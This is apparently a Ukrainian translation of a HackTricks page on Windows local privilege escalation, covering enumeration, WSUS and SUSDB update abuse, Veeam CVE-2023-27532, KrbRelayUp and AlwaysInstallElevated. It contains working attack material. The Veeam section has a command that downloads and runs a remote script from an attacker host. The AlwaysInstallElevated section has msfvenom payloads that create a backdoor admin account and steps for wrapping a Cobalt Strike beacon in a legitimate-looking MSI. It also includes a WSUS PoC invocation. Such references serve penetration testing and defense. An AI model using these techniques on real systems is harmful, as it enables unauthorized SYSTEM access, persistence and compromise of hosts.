# Підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практична послідовність перерахування також спирається на воркшопи та чеклісти спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичні матеріали про атаки включають презентацію DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Докладніше про ACL — DACL/SACL/ACE читайте на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **завадити вам перерахувати систему**, запускати виконувані файли або навіть **виявити вашу діяльність**. Перш ніж починати перерахування для підвищення привілеїв, слід **прочитати** цю **сторінку** та **перерахувати** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити редагування UEFI NVRAM в автономному режимі на DMA до завантаження та ланцюжок патчення пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / безшумне підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Ознайомтеся з окремим робочим процесом обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру спеціальних можливостей Secure Desktop можна використати для довільного запису в реєстр від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У нещодавніх збірках Windows також з’явився шлях LPE через **SMB на довільному порту**, за якого привілейована локальна автентифікація NTLM відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перерахування відомостей про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені оновлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти для конкретних версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку становить середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та потенційно відповідні бюлетені; перш ніж вважати результат застосовним, перевірте точний продукт і замінні оновлення.

Для локального експлойту, призначеного для конкретної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` надає цьому процесу доступ до нативного системного каталогу. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або відсутнє оновлення KB самі по собі не доводять можливість експлуатації; порівняйте поточну збірку, встановлене або замінне оновлення, архітектуру процесу та передумови експлойту з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), що стосується саме цієї проблеми.

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено в змінних середовища якісь облікові дані/Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити файли до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт є лише підказкою, якщо його вміст розкриває обліковий запис із вищими привілеями, який можна використати, і цей обліковий запис може виконати вхід у відповідному контексті.

### Module Logging у PowerShell

Записуються відомості про виконання конвеєра PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, виконайте інструкції з розділу документації «Файли транскриптів», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повна активність і весь вміст виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає вичерпний аудиторський слід кожної дії, цінний для форензики й аналізу шкідливої поведінки. Документування всієї активності під час виконання надає детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання Script Block можна знайти в Переглядачі подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Операційний**.\
Щоб переглянути останні 20 подій, можна скористатися:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP-ендпоінт WSUS є приводом перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень і їх встановлення на клієнті. Самої URL-адреси недостатньо, щоб підтвердити можливість виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або наведене нижче в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримуєте відповідь на кшталт однієї з таких:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану службу інтрамережі. Це підтверджує передумову для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття зловмисних оновлень або встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна налаштована кінцева точка WSUS не вибирається цією політикою.

Для експлуатації цих вразливостей можна використовувати такі інструменти, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM-скрипти експлойтів для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження можна прочитати тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт можна прочитати тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка експлуатує такий недолік:

> Якщо ми можемо змінювати проксі-сервер локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код від імені користувача з підвищеними привілеями на нашому пристрої.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми створимо самопідписаний сертифікат для імені хоста WSUS і додамо його до сховища сертифікатів поточного користувача, то зможемо перехоплювати трафік WSUS як HTTP, так і HTTPS. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки довіри за принципом trust-on-first-use. Якщо сертифікат, який надається, є довіреним для користувача та має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли його опублікують).

### Оновлення WSUS, контрольовані адміністратором

Окремий шлях доступний, якщо поточна ідентичність може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте фактичне членство в групі сервера `WSUS Administrators` і будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, якій буде призначено затверджене оновлення. [Microsoft вимагає привілеїв адміністратора WSUS для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [описує зв’язок довіри під час публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджують виконання цих умов.

### Зловживання власними оновленнями SUSDB: непідписані корисні навантаження через `.txt`/`.esd`

Це інша помилка межі довіри, ніж перехоплення HTTP-з’єднання WSUS: передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)** для публікації та затвердження власного оновлення. Один із практичних способів отримати такий доступ — передати автентифікацію облікового запису комп’ютера upstream WSUS на окремий сервер MSSQL, на якому розміщено `SUSDB`; точні передумови залежать від розгортання, тому спочатку перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, за якого автентифікація клієнта WSUS ретранслюється з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, вибір цілі та затвердження оновлення

Робочий процес власного оновлення використовує легітимні процедури WSUS як обмежений API для публікації. Важливі такі переходи станів:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із передумовами, локалізацією та розширеними даними | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованої зловмисником URL-адреси | `spSetBatchURL` |
| Перегляд/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають збігатися в імпортованих метаданих і фрагментах. Після призначення URL-адреси вмісту та групи цілей фінальне затвердження має приблизно такий вигляд; використовуйте нові ідентифікатори оновлення, групи й розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису через розширення файлу

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо ім’я переданого файлу закінчується на `.txt` або `.esd`; `CheckCertificateSignature` тоді пропускається без попередньої перевірки, що байти є текстом або справжнім образом ESD. Тому незмінений PE-файл, названий, наприклад, `payload.exe.txt`, може пройти перевірку вмісту, а згодом бути запущеним обробником встановлення оновлення через командний рядок. Це помилка плутанини політики та типів, а не підробка підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Стейджинг і автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований контент. Джерело має відповідати вимогам BITS до HTTP: самого доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається зі скриптом `BitsWebServer.py` для стейджингу контенту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без нагляду та персистентність через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `4 - Auto download and schedule install` у `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` дає змогу схваленому оновленню завантажуватися та встановлюватися за налаштованим розкладом без ручного вибору користувача. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, одразу знову пропонувався після завершення процесу callback, тож поведінка повторних спроб може стати персистентним виконанням, що повторюється; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Вектори виявлення та посилення захисту

Корисні вектори для перевірки на сервері та клієнті в цьому ланцюжку:<sup>[[39]](#references)</sup>

- Перевіряйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; досліджуйте нові групи таргетингу, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` та розгортання, виконані неочікуваними принципалами (особливо обліковими записами, що не належать комп’ютерам).
- Переглядайте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не довіряйте суфіксу.
- Виявляйте випадки, коли встановлення Windows Update неодноразово завершується помилкою/повторюється, а також виконання PE-файлів або неочікувану дочірню/мережеву активність із вмісту з назвами `.txt` чи `.esd`.
- Якщо це підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте права `EXECUTE` на процедурах користувацьких оновлень і перевіряйте їх.

## Сторонні засоби автоматичного оновлення та IPC агента (локальне підвищення привілеїв)

Багато корпоративних агентів надають IPC-інтерфейс на localhost і привілейований канал оновлення. Якщо процес реєстрації можна спрямувати на сервер зловмисника, а засіб оновлення довіряє шахрайському кореневому CA або має слабкі перевірки підписувача, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) описано тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання на **TCP/9401 за замовчуванням**. [Рекомендація Veeam](https://www.veeam.com/kb4424) описує неавтентифіковане розкриття облікових даних зашифрованої бази конфігурації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прив’язуватися не лише до localhost, тому перевірте її фактичну адресу та PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка виправлень.
- **Мінімальні виправлені версії**: Veeam вказує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. За чотирикомпонентною версією файлу не можна відрізнити невиправлену базову збірку від пізнішого виправлення для тих самих номерів збірок. Перш ніж вважати граничну збірку виправленою, звірте ідентифікатор виправлення з [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: помістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL-файлами Veeam в ту саму директорію, а потім активуйте payload SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

У наведеному PoC показано виконання команд від імені SYSTEM за наявності додаткових передумов; в advisory постачальника описано проблему розкриття облікових даних.
## KrbRelayUp

Локальний Kerberos relay може перейти від входу користувача з нижчими привілеями до запису в привілейований каталог, якщо відповідний COM-сервер автентифікується, а ретрансльований принципал має права на цільовий об’єкт. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) записи RBCD та `msDS-KeyCredentialLink` (shadow-credential) через LDAP; KrbRelayUp автоматизує деякі з цих сценаріїв. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за сертифікатом. Жоден із цих шляхів не випливає лише з членства в домені.

Перевірте фактичні політики [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) та [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) на DC, ACL об’єкта ретрансльованої особи та рівні автентифікації й уособлення вибраного класу COM. Важливі тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. На результат також можуть впливати маршрутизація через брандмауер/OXID та встановлені оновлення. Вважайте дозвільну політику або відповідний ACL потенційним об’єктом перевірки; пасивне перерахування не повинно запускати примусове звернення COM, автентифікацію через relay або записи в каталог. Shadow credential облікового запису комп’ютера може дати змогу отримати машинний квиток і лише за умови, що цей обліковий запис має необхідні права реплікації каталогу, — перейти до окремого шляху DCSync.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнені** (значення **0x1**), користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зауважте, що можна запакувати файл «**.bat**», якщо потрібно лише **виконати** **командні рядки**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit новий **Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, задайте для розташування **`C:\privesc`**, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для додавання). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виберіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** із **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб встановлена програма виглядала легітимніше.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Наостанок **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, перевірте, чи платформу встановлено як x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивірусні засоби та детектори

### Параметри аудиту

Ці параметри визначають, що саме **журналюється**, тож зверніть на них увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: цікаво дізнатися, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локального адміністратора**, гарантуючи, що на комп’ютерах, приєднаних до домену, кожен пароль **унікальний, випадковий і регулярно оновлюється**. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACL, які дозволяють переглядати паролі локального адміністратора за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функцію ввімкнено, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби недовірених процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Докладніше про захист LSA**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніше про Credential Guard можна дізнатися тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Локальним органом безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелік користувачів і груп

Перевірте, чи мають якісь із груп, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, то можете підвищити привілеї**. Дізнайтеся про привілейовані групи та про те, як зловживати їхніми можливостями для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції з токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

